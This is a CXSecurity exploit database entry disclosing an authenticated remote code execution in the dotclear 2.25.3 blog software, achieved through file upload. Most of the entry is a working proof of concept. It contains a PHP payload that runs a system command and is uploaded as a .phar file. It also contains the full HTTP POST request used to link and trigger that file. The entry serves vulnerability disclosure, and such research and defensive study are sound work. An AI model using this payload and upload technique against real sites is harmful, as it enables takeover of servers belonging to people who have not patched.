---
title: dotclear 2.25.3 Shell Upload
url: https://cxsecurity.com/issue/WLB-2023040037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-11
fetch_date: 2025-10-04T11:29:26.064115
---

# dotclear 2.25.3 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **dotclear 2.25.3 Shell Upload** **2023.04.10**  Credit:  **[Mirabbas Agalarov](https://cxsecurity.com/author/Mirabbas%2BAgalarov/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

Exploit Title: dotclear 2.25.3 - Remote Code Execution (RCE) (Authenticated)
Application: dotclear
Version: 2.25.3
Bugs: Remote Code Execution (RCE) (Authenticated) via file upload
Technology: PHP
Vendor URL: https://dotclear.org/
Software Link: https://dotclear.org/download
Date of found: 08.04.2023
Author: Mirabbas Ağalarov
Tested on: Linux
2. Technical Details & POC
========================================
While writing a blog post, we know that we can upload images. But php did not allow file upload. This time
<?php echo system("id"); ?>
I wrote a file with the above payload, a poc.phar extension, and uploaded it.
We were able to run the php code when we visited your page
poc request:
POST /dotclear/admin/post.php HTTP/1.1
Host: localhost
Content-Length: 566
Cache-Control: max-age=0
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: dcxd=f3bb50e4faebea34598cf52bcef38548b68bc1cc
Connection: close
post\_title=Welcome+to+Dotclear%21&post\_excerpt=&post\_content=%3Cp%3EThis+is+your+first+entry.+When+you%27re+ready+to+blog%2C+log+in+to+edit+or+delete+it.fghjftgj%3Ca+href%3D%22%2Fdotclear%2Fpublic%2Fpoc.phar%22%3Epoc.phar%3C%2Fa%3E%3C%2Fp%3E%0D%0A&post\_notes=&id=1&save=Save+%28s%29&xd\_check=ca4243338e38de355f21ce8a757c17fbca4197736275ba4ddcfced4a53032290d7b3c50badd4a3b9ceb2c8b3eed2fc3b53f0e13af56c68f2b934670027e12f4e&post\_status=1&post\_dt=2023-04-08T06%3A37&post\_lang=en&post\_format=xhtml&cat\_id=&new\_cat\_title=&new\_cat\_parent=&post\_open\_comment=1&post\_password=
poc video : https://youtu.be/oIPyLqLJS70

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040037)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top